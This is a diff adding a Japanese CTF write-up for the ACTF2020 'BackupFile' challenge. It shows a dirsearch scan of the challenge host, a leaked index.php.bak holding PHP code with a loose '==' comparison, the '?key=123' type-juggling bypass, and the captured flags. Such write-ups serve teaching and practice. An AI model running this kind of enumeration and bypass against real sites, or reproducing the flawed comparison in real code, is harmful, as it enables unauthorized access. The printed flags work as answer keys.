@@ -22,6 +22,7 @@
 - [[SUCTF 2019]CheckIn](#suctf-2019checkin)
 - [[极客大挑战 2019]BabySQL](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019babysql)
 - [[极客大挑战 2019]Upload](#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019upload)
+- [[ACTF2020 新生赛]BackupFile](#actf2020-%E6%96%B0%E7%94%9F%E8%B5%9Bbackupfile)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -933,3 +934,69 @@ Filename extensions	.php, .phtml, .php3, .php4, .php5, .php7, .phps, .php-s, .ph
 ```
 GIF89a flag{4ae465ec-f085-4c73-aeab-cd678b3ed2f6} flag{4ae465ec-f085-4c73-aeab-cd678b3ed2f6}
 ```
+
+# [ACTF2020 新生赛]BackupFile
+
+問題の名前からしてバックアップファイルが存在すると考えられるのでdirsearchをつかってディレクトリやファイルをenumerateします。
+
+```
+$ python3 ./dirsearch.py -u http://74e61b6d-5f8b-4981-ae58-1c278c389024.node3.buuoj.cn/ -e php -s 1
+
+ _|. _ _  _  _  _ _|_    v0.3.9                                                  
+(_||| _) (/_(_|| (_| )                                                           
+                                                                                 
+Extensions:  | HTTP method: GET | Suffixes: php | Threads: 10 | Wordlist size: 6498 | Request count: 6498                                                         
+
+Error Log: /home/kali/dirsearch/logs/errors-20-08-15_04-04-09.log
+
+Target: http://74e61b6d-5f8b-4981-ae58-1c278c389024.node3.buuoj.cn/              
+                                                                                 
+Output File: /home/kali/dirsearch/reports/74e61b6d-5f8b-4981-ae58-1c278c389024.node3.buuoj.cn/20-08-15_04-04-11
+
+[04:04:11] Starting: 
+[04:07:23] 400 -  154B  - /%2e%2e/google.com                          
+[04:07:23] 200 -   28B  - /php                
+[04:09:04] 200 -   28B  - /adminphp                                  
+[04:13:44] 200 -   28B  - /index.php                                 
+[04:13:46] 200 -  347B  - /index.php.bak                             
+[04:15:14] 200 -   28B  - /myadminphp                                
+                                                                     
+Task Completed
+```
+
+```
+% cat index.php.bak 
+<?php
+include_once "flag.php";
+
+if(isset($_GET['key'])) {
+    $key = $_GET['key'];
+    if(!is_numeric($key)) {
+        exit("Just num!");
+    }
+    $key = intval($key);
+    $str = "123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3";
+    if($key == $str) {
+        echo $flag;
+    }
+}
+else {
+    echo "Try to find out source file!";
+}
+```
+
+intval関数とは
+> intval — 変数の整数としての値を取得する
+
+GETで受け取ったkeyを整数に変換したものと$strに代入されてる文字列を比較してるだけです。
+
+適当に?key=123とうったらflagがでてきました。
+```
+flag{02ce6e8f-c87a-4c79-a2b4-622b5e24bfeb}
+```
+
+これはPHP type jugglingを利用したものでphpで==で比較するとき、文字列と整数を比較すると文字列を整数に変換しようとするので先頭の数字の部分さえあっていればtrueを返してしまうものを利用していると考えられます。
+
+## 参考サイト
+
+https://yohhoy.hatenadiary.jp/entry/20180529/p1
